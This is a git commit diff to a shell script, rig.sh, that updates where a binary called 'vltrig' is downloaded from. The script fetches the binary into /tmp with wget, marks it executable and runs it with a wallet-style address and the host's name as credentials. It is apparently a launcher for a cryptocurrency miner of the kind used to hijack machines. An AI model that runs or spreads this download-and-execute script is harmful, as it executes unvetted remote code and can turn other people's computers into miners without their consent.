c57e6fd340713dafa26fc74a4ea497dbd22807e0
ivanhi0 <idbod@ivanhi0.ru>
2026-04-13 09:49:15 +0300

    Fix downloading

--- rig.sh
+++ rig.sh
@@ -1,6 +1,6 @@
 #!/bin/sh
 
 cd /tmp
-wget https://ivanhi0.github.io/vltrig
+wget https://github.com/ivanhi0/ivanhi0.github.io/raw/refs/heads/main/vltrig
 chmod +x ./vltrig
 ./vltrig --user 42zHmvjLFQf6nLHbVCzm5RNxwovafb9mbPhYixC9ynFn29uxjGfPY3Z1BM5e2RXdnyiZCcujqznUoJ7AfPQpy4BPU7UrCJb --pass $(hostname -b)
